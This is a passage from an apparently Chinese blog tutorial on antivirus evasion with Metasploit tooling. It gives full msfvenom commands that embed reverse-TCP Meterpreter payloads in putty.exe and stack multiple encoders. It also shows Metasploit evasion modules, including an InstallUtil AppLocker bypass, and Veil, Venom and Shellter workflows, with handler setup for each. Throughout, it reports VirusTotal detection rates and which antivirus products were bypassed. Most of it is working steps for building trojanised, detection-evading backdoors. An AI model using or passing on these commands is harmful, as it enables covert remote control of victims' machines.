alt=\"image-20220526191328018\"></p>\n<p>由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。</p>\n<p>360和火绒都能查杀。</p>\n<p>在virustotal.com上查杀率为48&#x2F;67（原po为51&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261914178.png\" alt=\"image-20220526191412121\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205261915497.png\" alt=\"image-20220526191549429\"></p>\n<p>VT查杀成功：</p>\n<p><img src=\"/./images/202205261918483.png\" alt=\"image-20220526191847382\"></p>\n<p>VT查杀失败：</p>\n<p><img src=\"/./images/202205261918665.png\" alt=\"image-20220526191857605\"></p>\n<h3 id=\"msf自捆绑免杀-VT查杀率15-69\"><a href=\"#msf自捆绑免杀-VT查杀率15-69\" class=\"headerlink\" title=\"msf自捆绑免杀(VT查杀率15&#x2F;69)\"></a>msf自捆绑免杀(VT查杀率15&#x2F;69)</h3><p>在生成payload时可以使用捆绑功能，使用msfvenom的<code>-x</code>参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，<code>-x</code>后面跟对应文件路径就可以。</p>\n<p>这里使用一个正规的<code>putty.exe</code>作为被捆绑测试软件。</p>\n<p>生成payload命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666  -x putty.exe  -f exe -o /mnt/hgfs/Share/payload3.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261921270.png\" alt=\"image-20220526192124189\"></p>\n<p>生成的两个文件对比，大小完全一样。能否免杀也和被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。</p>\n<p><img src=\"/./images/202205261922615.png\" alt=\"image-20220526192251559\"></p>\n<p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒也能查杀）。</p>\n<p>在virustotal.com上查杀率为15&#x2F;69（原po为39&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261925172.png\" alt=\"image-20220526192548112\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205261932310.png\" alt=\"image-20220526193243216\"></p>\n<h3 id=\"msf自捆绑-编码-VT查杀率16-69\"><a href=\"#msf自捆绑-编码-VT查杀率16-69\" class=\"headerlink\" title=\"msf自捆绑+编码(VT查杀率16&#x2F;69)\"></a>msf自捆绑+编码(VT查杀率16&#x2F;69)</h3><p>将上面的编码和捆绑两种方法结合一下进行尝试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261933974.png\" alt=\"image-20220526193359812\"></p>\n<p>与上一种方法对比，大小完全一样。</p>\n<p><img src=\"/./images/202205261935858.png\" alt=\"image-20220526193552798\"></p>\n<p>可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。</p>\n<p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒动态静态均能查杀，而360不会报毒）。</p>\n<p>在virustotal.com上查杀率为16&#x2F;69（原po为35&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261940527.png\" alt=\"image-20220526194032466\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205261938216.png\" alt=\"image-20220526193813109\"></p>\n<h3 id=\"msfvenom多重编码-VT查杀率28-67\"><a href=\"#msfvenom多重编码-VT查杀率28-67\" class=\"headerlink\" title=\"msfvenom多重编码(VT查杀率28&#x2F;67)\"></a>msfvenom多重编码(VT查杀率28&#x2F;67)</h3><p>msfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。</p>\n<p>如下命令，使用管道让<code>msfvenom</code>对攻击载荷多重编码，先用<code>shikata_ga_nai</code>编码20次，接着来10次的<code>alpha_upper</code>编码，再来10次的<code>countdown</code>编码，最后才生成以<code>putty.exe</code>为模板的可执行文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe</span><br></pre></td></tr></table></figure>\n\n<p>如果报错<code>Error: You must select an arch for a custom payload</code>，则添加参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-a x86 --platform windows</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261949206.png\" alt=\"image-20220526194938055\"></p>\n<p>还有更多重编码姿势：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; payload6.exe</span><br></pre></td></tr></table></figure>\n\n<p>经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。</p>\n<p>360可以查杀，火绒不能查杀。</p>\n<p>在virustotal.com上查杀率为28&#x2F;67（原po为45&#x2F;70），Bypass了McAfee。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261951182.png\" alt=\"image-20220526195103114\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205261956521.png\" alt=\"image-20220526195652390\"></p>\n<h2 id=\"Metasploit-Evasion免杀\"><a href=\"#Metasploit-Evasion免杀\" class=\"headerlink\" title=\"Metasploit Evasion免杀\"></a>Metasploit Evasion免杀</h2><p>2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。evasion有以下几个模块,可以使用<code>show evasion</code>进行查看。</p>\n<p>msf6 evasion模块：</p>\n<p><img src=\"/./images/202205270847820.png\" alt=\"image-20220527084747663\"></p>\n<h3 id=\"生成exe-VT查杀率43-69\"><a href=\"#生成exe-VT查杀率43-69\" class=\"headerlink\" title=\"生成exe(VT查杀率43&#x2F;69)\"></a>生成exe(VT查杀率43&#x2F;69)</h3><p>使用<code>use windows/windows_defender_exe</code>进行生成payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use windows/windows_defender_exe</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload.exe</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205270855472.png\" alt=\"image-20220527085549361\"></p>\n<p>不打开杀软的情况下，可正常上线：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>\n\n<p>打开杀软，360和火绒都能查杀。</p>\n<p>在virustotal.com上查杀率为43&#x2F;69（原po为42&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205270858477.png\" alt=\"image-20220527085842405\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205270857265.png\" alt=\"image-20220527085747182\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205270900839.png\" alt=\"image-20220527090002712\"></p>\n<h3 id=\"生成hta-VT查杀率14-59\"><a href=\"#生成hta-VT查杀率14-59\" class=\"headerlink\" title=\"生成hta(VT查杀率14&#x2F;59)\"></a>生成hta(VT查杀率14&#x2F;59)</h3><p>用另外一个evasion模块<code>windows/windows_defender_js_hta</code>生成一下，360同样被杀。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use windows/windows_defender_js_hta</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload1.exe</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>\n\n<p>但是火绒静态+行为查杀都没发现问题，可正常上线。</p>\n<p>在virustotal.com上查杀率为14&#x2F;59。不过在线查毒时显示360也没查出来，但本地测试时却是能查出来的，所以在线查杀还是不太精准的。</p>\n<p>复现时该模块生成的可执行无法运行。</p>\n<h3 id=\"生成install-util-VT查杀率33-69\"><a href=\"#生成install-util-VT查杀率33-69\" class=\"headerlink\" title=\"生成install_util(VT查杀率33&#x2F;69)\"></a>生成install_util(VT查杀率33&#x2F;69)</h3><p>evasion还提供了其他几个模块，比如<code>windows/applocker_evasion_install_util</code></p>\n<p>创建payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use windows/applocker_evasion_install_util</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lhost 192.168.174.128</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lport 6666</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[+] install_util.txt stored at /Users/xysoul/.msf4/local/install_util.txt</span><br><span class=\"line\">[*] Copy install_util.txt to the target</span><br><span class=\"line\">[*] Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:install_util.exe install_util.txt</span><br><span class=\"line\">[*] Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>\n\n<p>根据说明，需要使用csc.exe进行编译一下，然后用<code>InstallUtil.exe</code>加载文件。</p>\n<p>csc.exe是微软.NET Framework 中的C#语言编译器，本机安装了.net后就可以找到该文件。用vs2017里的csc.exe进行编译，生成install_util.exe。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\csc.exe /out:install_util.exe install_util.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205270927923.png\" alt=\"image-20220527092742869\"></p>\n<p>直接执行<code>install_util.exe</code>，无法上线，并且360查杀报毒。</p>\n<p>根据说明，需要使用<code>InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</code>来加载，才能成功上线。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>\n\n<p>注意的是，如果生成的是32位的payload，就要用32位的.net下的InstallUtil来加载，否则文件会无法执行。</p>\n<p><img src=\"/./images/202205270931141.png\" alt=\"image-20220527093115067\"></p>\n<p>360和火绒都能查杀（原po静态查杀都没有问题，执行时360行为查杀会报毒）。</p>\n<p>在virustotal.com上查杀率为33&#x2F;69（原po为12&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205270932856.png\" alt=\"image-20220527093207774\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205270935961.png\" alt=\"image-20220527093508879\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205270936872.png\" alt=\"image-20220527093615742\"></p>\n<h2 id=\"Veil免杀\"><a href=\"#Veil免杀\" class=\"headerlink\" title=\"Veil免杀\"></a>Veil免杀</h2><p>Veil、Venom和Shellter是三大老牌免杀工具。</p>\n<p>Veil-Evasion是一个用python写的免杀框架，可以将任意脚本或一段shellcode转换成Windows可执行文件，还能利用Metasploit框架生成相兼容的Payload工具，从而逃避了常见防病毒产品的检测。</p>\n<h3 id=\"安装Veil\"><a href=\"#安装Veil\" class=\"headerlink\" title=\"安装Veil\"></a>安装Veil</h3><p>推荐Docker方式进行安装。镜像地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://hub.docker.com/r/mattiasohlsson/veil/</span><br></pre></td></tr></table></figure>\n\n<p>拉取veil镜像：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull mattiasohlsson/veil</span><br></pre></td></tr></table></figure>\n\n<p>拉取成功后，执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>\n\n<p><code>-v /tmp/veil-output:/var/lib/veil/output:Z</code>是将宿主机的<code>/tmp/veil-output</code>目录映射到docker里面，这样veil生成的payload可以直接在宿主机里使用。</p>\n<p>之后再进入镜像可以在启动镜像后使用下面命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exec -it &lt;container id&gt; /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>执行<code>veil</code>命令可启动,版本为3.1.1。</p>\n<p>veil有两个免杀的工具，Evasion和Ordnance。Ordnance可生成在Veil-Evasion中使用的shellcode，Evasion是用做文件免杀。一般选择Evasion。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Veil&gt;: use 1                   #选择Evasion功能</span><br><span class=\"line\">Veil/Evasion&gt;: list            #查看payload列表</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>list</code>可以看到到41种stager。</p>\n<p><img src=\"/./images/202205270946813.png\" alt=\"image-20220527094613602\"></p>\n<p>推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。</p>\n<p>veil原理可以参考：<a href=\"https://xz.aliyun.com/t/4191\">https://xz.aliyun.com/t/4191</a></p>\n<h3 id=\"使用veil直接生成exe-VT查杀率44-69\"><a href=\"#使用veil直接生成exe-VT查杀率44-69\" class=\"headerlink\" title=\"使用veil直接生成exe(VT查杀率44&#x2F;69)\"></a>使用veil直接生成exe(VT查杀率44&#x2F;69)</h3><p>veil可以直接生成支持msf的payload，我们先试一下看看效果。</p>\n<p>使用go语言生成msf的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Veil/Evasion&gt;: use 16</span><br></pre></td></tr></table></figure>\n\n<p>设置好msf的监听主机和端口：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[go/meterpreter/rev_tcp&gt;&gt;]: set lhost 192.168.174.128</span><br><span class=\"line\">[go/meterpreter/rev_tcp&gt;&gt;]: set lport 6666</span><br><span class=\"line\">[go/meterpreter/rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205270959676.png\" alt=\"image-20220527095925448\"></p>\n<p>设定好生成的payload的名称，例如payload1：</p>\n<p><img src=\"/./images/202205270950182.png\" alt=\"image-20220527094916300\"></p>\n<p>一系列编码编译之后，就生成payload了：</p>\n<p><img src=\"/./images/202205270950223.png\" alt=\"image-20220527095021088\"></p>\n<p>因为之前已经做过Docker目录映射，所以在宿主机的<code>/tmp/veil-output/compiled/</code>目录可直接看到生成的exe文件。</p>\n<p>在msf中监听：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use exploit/multi/handler</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set lhost 192.168.174.128</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>\n\n<p>在测试主机执行<code>payload1.exe</code>，360和火绒均可以查杀（原po在msf中可上线，360和火绒均不报毒）。</p>\n<p>在virustotal.com上查杀率为44&#x2F;69（原po为44&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271002159.png\" alt=\"image-20220527100249086\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271011302.png\" alt=\"image-20220527101107223\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205271013133.png\" alt=\"image-20220527101335024\"></p>\n<h3 id=\"使用veil-mingw-w64-VT查杀率11-69\"><a href=\"#使用veil-mingw-w64-VT查杀率11-69\" class=\"headerlink\" title=\"使用veil+mingw-w64(VT查杀率11&#x2F;69)\"></a>使用veil+mingw-w64(VT查杀率11&#x2F;69)</h3><p>先用veil生成shellcode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># veil</span><br><span class=\"line\">Veil&gt; use 1\t\t\t\t\t\t\t\t# 选择使用 Veil-Evasion 模块</span><br><span class=\"line\">Veil/Evasion&gt; use 7\t\t\t\t\t\t# 选择payload  c/meterpreter/rev_tcp.py</span><br><span class=\"line\">[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.174.128</span><br><span class=\"line\">[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 6666</span><br><span class=\"line\">[cs/meterpreter/rev_tcp&gt;&gt;] generate</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205271016580.png\" alt=\"image-20220527101615402\"></p>\n<p>输入生成文件名为<code>c_msf</code>：</p>\n<p><img src=\"/./images/202205271016611.png\" alt=\"image-20220527101633513\"></p>\n<p>先生成一个可以被 msf 利用的 <code>c_msf.c</code> 然后用mingw-w64 来编译。</p>\n<p>mingw-w64的安装可参考：<a href=\"https://zhuanlan.zhihu.com/p/76613134\">https://zhuanlan.zhihu.com/p/76613134</a></p>\n<p>若编译报错，可以尝试指定库，生成可执行文件a.exe：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc c_msf.c -lws2_32</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205271121046.png\" alt=\"image-20220527112104971\"></p>\n<p>360和火绒均可以查杀（原po全程开启360卫士和杀毒以及火绒，编译、运行、上线都没有问题）。</p>\n<p>在virustotal.com上查杀率为11&#x2F;69（原po为23&#x2F;71）。Bypass了McAfee。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271124553.png\" alt=\"image-20220527112426483\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271122178.png\" alt=\"image-20220527112257096\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205271126466.png\" alt=\"image-20220527112633347\"></p>\n<h2 id=\"Venom免杀\"><a href=\"#Venom免杀\" class=\"headerlink\" title=\"Venom免杀\"></a>Venom免杀</h2><p>Venom利用msfvenom（metasploit）生成不同的格式的shellcode，如（c | python | ruby | dll | msi | hta-psh）等，然后将生成的shellcode注入一个模板（例如：python），并使用类似gcc、mingw32或pyinstaller之类的编译器生成可执行文件。</p>\n<p>Venom的一些功能还会直接调用<code>Veil-Evasion.py</code>，<code>unicorn.py</code>，<code>powersploit.py</code>等来直接创建免杀程序，避免重复造轮子。</p>\n<h3 id=\"安装Venom\"><a href=\"#安装Venom\" class=\"headerlink\" title=\"安装Venom\"></a>安装Venom</h3><p>venom安装和运行必须是在图形界面下，如果是ssh终端连接到kali进行连接是不行的。venom依赖的软件比较多，所以安装出现问题是很正常的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Zenity | Metasploit | GCC (compiler) | Pyinstaller (compiler)</span><br><span class=\"line\">mingw32 (compiler) | pyherion.py (crypter) | wine (emulator)</span><br><span class=\"line\">PEScrambler.exe (PE obfuscator) | apache2 (webserver)| winrar (wine)</span><br><span class=\"line\">vbs-obfuscator (obfuscator) | avet (Daniel Sauder) | shellter (KyRecon)</span><br><span class=\"line\">ettercap (MitM + DNS_Spoofing) | encrypt_PolarSSL (AES crypter)</span><br></pre></td></tr></table></figure>\n\n<p>从github上拖到本地</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/r00t-3xp10it/venom.git</span><br></pre></td></tr></table></figure>\n\n<p>修改文件执行权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd venom</span><br><span class=\"line\">sudo chmod -R +x *.sh</span><br><span class=\"line\">sudo chmod -R +x *.py</span><br></pre></td></tr></table></figure>\n\n<p>安装依赖库和软件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd aux</span><br><span class=\"line\">sudo ./setup.sh</span><br></pre></td></tr></table></figure>\n\n<p>运行venom，代码高亮有些问题，但是问题不大，还是可以用的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo ./venom.sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205271736471.png\" alt=\"image-20220527173623380\"></p>\n<h3 id=\"venom生成exe-VT查杀率35-68\"><a href=\"#venom生成exe-VT查杀率35-68\" class=\"headerlink\" title=\"venom生成exe(VT查杀率35&#x2F;68)\"></a>venom生成exe(VT查杀率35&#x2F;68)</h3><p>启动venom:<code>sudo ./venom.sh</code>，然后选择windows，也就是2，然后会列出所有windows可用的20个agent。</p>\n<p><img src=\"/./images/202205271737599.png\" alt=\"image-20220527173757520\"></p>\n<p>支持的种类还是比较全面的，shellter、avet等免杀工具都内置在里面了，而且支持很多种类似的payload格式。</p>\n<p>先生成一个最简单直接的，第4个模块，通过C编译EXE程序。</p>\n<p>在输入4之后，会弹出一个框让你输入ip地址，这个就是你msf监听主机的地址：</p>\n<p><img src=\"/./images/202205271739076.png\" alt=\"image-20220527173929002\"></p>\n<p>然后输入端口号之后，选择payload，选择最常规的<code>windows/meterperter/reverse_tcp</code>。</p>\n<p>输入一个文件名，例如notepad。</p>\n<p><img src=\"/./images/202205271740284.png\" alt=\"image-20220527174056207\"></p>\n<p>然后在编译和生成exe的过程中，会弹出来两个选项框，一般默认就行。</p>\n<p>之后会提示已经生成，并询问你如何分发payload，直接在测试机上执行就行了，可见output文件夹已经生成了notepad.exe。</p>\n<p><img src=\"/./images/202205271742310.png\" alt=\"image-20220527174259258\"></p>\n<p>360和火绒均可以查杀（原po360静态检测没问题，但行为检测能查杀出为病毒；火绒则静态+动态都没有检测到）。</p>\n<p>在virustotal.com上查杀率为35&#x2F;68（原po为19&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271800602.png\" alt=\"image-20220527180055539\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271801624.png\" alt=\"image-20220527180138530\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205271804004.png\" alt=\"image-20220527180452891\"></p>\n<h3 id=\"venom生成dll-VT查杀率11-70\"><a href=\"#venom生成dll-VT查杀率11-70\" class=\"headerlink\" title=\"venom生成dll(VT查杀率11&#x2F;70)\"></a>venom生成dll(VT查杀率11&#x2F;70)</h3><p>选择windows之后，在agent中选择第1个，生成dll。</p>\n<p><img src=\"/./images/202205271807146.png\" alt=\"image-20220527180740091\"></p>\n<p>后面的操作和上面那个差不多，然后就能看到生成了<code>notepad.dll</code>文件。</p>\n<p>原po将文件拷贝到测试机上，命令行中执行<code>rundll32.exe notepad.dll,main</code>，可动静态免杀过360和火绒。msf正常上线。在virustotal.com上查杀率为11&#x2F;71。</p>\n<p>本文复现时出现问题：</p>\n<p><img src=\"/./images/202205271815246.png\" alt=\"image-20220527181539179\"></p>\n<h2 id=\"Shellter免杀\"><a href=\"#Shellter免杀\" class=\"headerlink\" title=\"Shellter免杀\"></a>Shellter免杀</h2><p>注意：</p>\n<ul>\n<li>shellter目前只能注入32位的可执行文件</li>\n<li>shellter需要管理员权限运行</li>\n</ul>\n<h3 id=\"安装Shellter\"><a href=\"#安装Shellter\" class=\"headerlink\" title=\"安装Shellter\"></a>安装Shellter</h3><p>ubuntu系统中apt安装：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br><span class=\"line\">apt-get install shellter</span><br><span class=\"line\">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span><br></pre></td></tr></table></figure>\n\n<p>kali中不是很好用，windows中手动下载手动下载：</p>\n<p>官方下载站点<code>https://www.shellterproject.com/download/</code>，下载后解压，无需安装，cmd下可直接使用。</p>\n<p><img src=\"/./images/202205271824223.png\" alt=\"image-20220527182416161\"></p>\n<h3 id=\"生成payload（VT免杀率7-69\"><a href=\"#生成payload（VT免杀率7-69\" class=\"headerlink\" title=\"生成payload（VT免杀率7&#x2F;69)\"></a>生成payload（VT免杀率7&#x2F;69)</h3><p>需要提前准备一个PE文件作为被注入程序。用之前选的<code>putty.exe</code>来进行测试。</p>\n<p>必须使用32位PE文件，下载一个32位putty.exe：</p>\n<p><img src=\"/./images/202205271827287.png\" alt=\"image-20220527182755237\"></p>\n<p>之后程序会把<code>putty.exe</code>进行备份，因为生成的payload会自动覆盖原来的<code>putty.exe</code>。</p>\n<p>但<code>putty-32.exe</code>生成报错，换了一个32位可执行文件<code>winrar.exe</code>：</p>\n<p><img src=\"/./images/202205271850186.png\" alt=\"image-20220527185054107\"></p>\n<p>选项<code>Enable Stealth Mode</code>，是否启用隐身模式，启用后免杀效果会变差，建议不启用。</p>\n<p>还是选择<code>windows/meterpreter/reverse_tcp</code>作为payload</p>\n<p><img src=\"/./images/202205271852105.png\" 